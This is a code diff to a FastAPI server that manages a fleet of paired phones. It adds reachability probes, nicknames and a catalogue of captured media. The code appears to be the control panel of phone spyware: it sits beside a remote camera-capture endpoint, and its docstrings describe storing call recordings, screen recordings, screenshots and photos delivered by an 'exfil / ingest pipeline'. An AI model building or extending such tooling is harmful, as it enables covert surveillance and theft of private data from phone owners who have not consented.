@@ -35,7 +35,26 @@ class RefreshRequest(BaseModel):
     host: str
     port: int = 8443
 
+class MediaRequest(BaseModel):
+    kind: str
+    path: str = ""
+    size_bytes: int = 0
+    duration_sec: float = 0.0
+    note: str = ""
+
+class NicknameRequest(BaseModel):
+    nickname: str
+
 # ---------- Helpers ----------
+
+def _probe_online(dev) -> bool:
+    """Quick reachability probe for the fleet UI (short timeout so an
+    offline phone never stalls the page)."""
+    try:
+        info, _ = health(dev.host, dev.port, cert_fp=dev.cert_fp or None, timeout=1.5)
+        return info.get("status") == "ok"
+    except Exception:
+        return False
 
 def _paired_device_or_error(key: str):
     """Resolve a paired device, refreshing its access token before use.
@@ -69,7 +88,12 @@ def _paired_device_or_error(key: str):
 async def index(request: Request):
     token = auth.get_session_token(request)
     if auth.validate_session(token):
-        return templates.TemplateResponse(request, "devices.html", {"devices": registry.get_all()})
+        devices = registry.get_all()
+        # Live reachability per device so the fleet UI can render
+        # ONLINE / OFFLINE (offline is shown in black).
+        for dev in devices.values():
+            dev.online = _probe_online(dev) if dev.paired else True
+        return templates.TemplateResponse(request, "devices.html", {"devices": devices})
     return templates.TemplateResponse(request, "login.html", {})
 
 @app.get("/dashboard/{key:path}", response_class=HTMLResponse)
@@ -215,6 +239,50 @@ async def device_camera_capture(host: str, port: int, camera_id: str,
     info, _ = camera_capture(dev.host, dev.token or "", camera_id, dev.port,
                              cert_fp=dev.cert_fp or None)
     return info
+
+# ---------- Media Catalogue & Nicknames (SQLite-backed, no phone needed) ----------
+
+@app.get("/api/device/{host}/{port}/media")
+async def device_media_list(host: str, port: int, _=Depends(require_login)):
+    """List captured media metadata for a device — call recordings, videos,
+    screen recordings, screenshots, photos. Read from the local DB; the
+    phone does not need to be reachable."""
+    key = f"{host}:{port}"
+    if not registry.get_device(key):
+        raise HTTPException(404, "Device not found")
+    return {"ok": True, "media": registry.list_media(key)}
+
+@app.post("/api/device/{host}/{port}/media")
+async def device_media_add(host: str, port: int, req: MediaRequest,
+                           _=Depends(require_login)):
+    """Register a captured file's metadata for a device (used by the exfil /
+    ingest pipeline; the phone app is not required for storage)."""
+    key = f"{host}:{port}"
+    if not registry.get_device(key):
+        raise HTTPException(404, "Device not found")
+    try:
+        entry = registry.add_media(key, req.kind, path=req.path,
+                                   size_bytes=req.size_bytes,
+                                   duration_sec=req.duration_sec, note=req.note)
+    except ValueError as e:
+        raise HTTPException(400, str(e))
+    return {"ok": True, "media": entry}
+
+@app.delete("/api/device/{host}/{port}/media/{media_id}")
+async def device_media_delete(host: str, port: int, media_id: int,
+                              _=Depends(require_login)):
+    registry.delete_media(media_id)
+    return {"ok": True}
+
+@app.post("/api/device/{host}/{port}/nickname")
+async def device_nickname(host: str, port: int, req: NicknameRequest,
+                          _=Depends(require_login)):
+    """Set a human-friendly nickname for the device (stored encrypted)."""
+    key = f"{host}:{port}"
+    if not registry.get_device(key):
+        raise HTTPException(404, "Device not found")
+    registry.set_nickname(key, req.nickname)
+    return {"ok": True, "nickname": req.nickname.strip()}
 
 # ---------- Static ----------
 
